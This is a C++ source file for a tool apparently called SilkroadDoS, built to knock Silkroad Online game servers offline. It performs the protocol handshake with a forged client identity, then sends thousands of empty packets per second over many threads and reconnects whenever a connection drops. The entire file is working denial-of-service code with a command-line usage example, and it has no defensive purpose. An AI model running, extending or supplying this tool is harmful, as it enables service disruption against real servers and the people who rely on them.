#include "stdio.h"
#include <iostream>
#include <string>
#include <stdarg.h>

#if _WIN32
	#include "winsock2.h"
	#include "windows.h"
	#pragma comment(lib, "ws2_32.lib")
#else
	#include <stdlib.h>
	#include <unistd.h>
	#include <sys/types.h>
	#include <sys/socket.h>
	#include <netinet/in.h>
	#include <netdb.h>
	#include <arpa/inet.h>
	#include <errno.h>
#endif

#include "shared/silkroad_security.h"
#include "shared/stream_utility.h"

std::string ip;
uint16_t port = 0;

#if _WIN32
void Attack(SOCKET s)
#else
void Attack(int s)
#endif
{
	char buffer[256] = {0};
	bool attack = false;
	SilkroadSecurity security;

	while(true)
	{
		while(attack)
		{
			for(int x = 0; x < 5000; ++x)
				security.Send(0, 0, 0, 0, 0);

			while(security.HasPacketToSend())
			{
				std::vector<uint8_t> packet = security.GetPacketToSend();
				int size = send(s, (const char*)&packet[0], packet.size(), 0);
				if(size == 0 || size == -1)
				{
					std::cout << "Connection closed" << std::endl;
					return;
				}
			}

#if _WIN32
			Sleep(1000);
#else
			sleep(1);
#endif
		}

		int size = recv(s, buffer, 255, 0);
		if(size == 0 || size == -1) return;

		security.Recv((uint8_t*)buffer, size);

		while(security.HasPacketToRecv())
		{
			PacketContainer packet = security.GetPacketToRecv();

			if(packet.opcode == 0x2001)
			{
				StreamUtility r(packet.data);

				std::string server = r.Read_Ascii(r.Read<uint16_t>());

				if(server == "GatewayServer")
				{
					StreamUtility w;
					w.Write<uint8_t>(22);
					w.Write<uint16_t>(9);
					w.Write_Ascii("SR_Client");
					w.Write<uint32_t>(123);

					security.Send(0x6100, w, 1, 0);
				}

				std::cout << "Attacking [" << server << "]" << std::endl;
			}
			else if(packet.opcode == 0x6005)
			{
				attack = true;

				std::cout << "Starting attack on [" << ip << ":" << port << "]" << std::endl;
			}
		}

		while(security.HasPacketToSend())
		{
			std::vector<uint8_t> packet = security.GetPacketToSend();
			size = send(s, (const char*)&packet[0], packet.size(), 0);

			if(size == 0 || size == -1) return;
		}
	}
}

#if _WIN32
DWORD WINAPI DenialOfService(LPVOID lParam)
{
	WSADATA WSAData = {0};
	WSAStartup(0x0202, &WSAData);

	sockaddr_in addr = {0};
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(ip.c_str());
	addr.sin_port = htons(port);

	while(true)
	{
		SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

		if(connect(s, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR)
		{
			std::cout << "Connect failed [" << WSAGetLastError() << "]" << std::endl;
			Sleep(5000);
			continue;
		}

		Attack(s);

		shutdown(s, 2);
		closesocket(s);

		Sleep(100);
	}
}
#else
void* DenialOfService(void* ptr)
{
	sockaddr_in addr = {0};
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(ip.c_str());
	addr.sin_port = htons(port);

	while(true)
	{
		int s = socket(AF_INET, SOCK_STREAM, 0);

		if(connect(s, (sockaddr*)&addr, sizeof(addr)) == -1)
		{
			std::cout << "Connect failed [" << errno << "]" << std::endl;
			sleep(5);
			continue;
		}

		Attack(s);

		shutdown(s, 2);
		close(s);

		usleep(100);
	}
}
#endif

int main(int argc, char* argv[])
{
	if(argc < 3)
	{
		std::cout << "Missing arguments" << std::endl;
		std::cout << "\t./SilkroadDoS 127.0.0.1 15779 5" << std::endl;
		return 0;
	}

	ip = argv[1];
	port = atoi(argv[2]);

	int threads = 1;
	if(argc == 4)
		threads = atoi(argv[3]) - 1;

	if(threads < 0)
	{
		std::cout << "Thread count must be 1 or higher" << std::endl;
		return 0;
	}

	threads -= 1;

	for(int x = 0; x < threads; ++x)
	{
#if _WIN32
		CreateThread(0, 0, DenialOfService, 0, 0, 0);
		Sleep(1);
#else
		pthread_t* thread = new pthread_t;
		pthread_create(thread, NULL, DenialOfService, NULL);
		usleep(1000);
#endif
	}

	DenialOfService(NULL);
	return 0;
}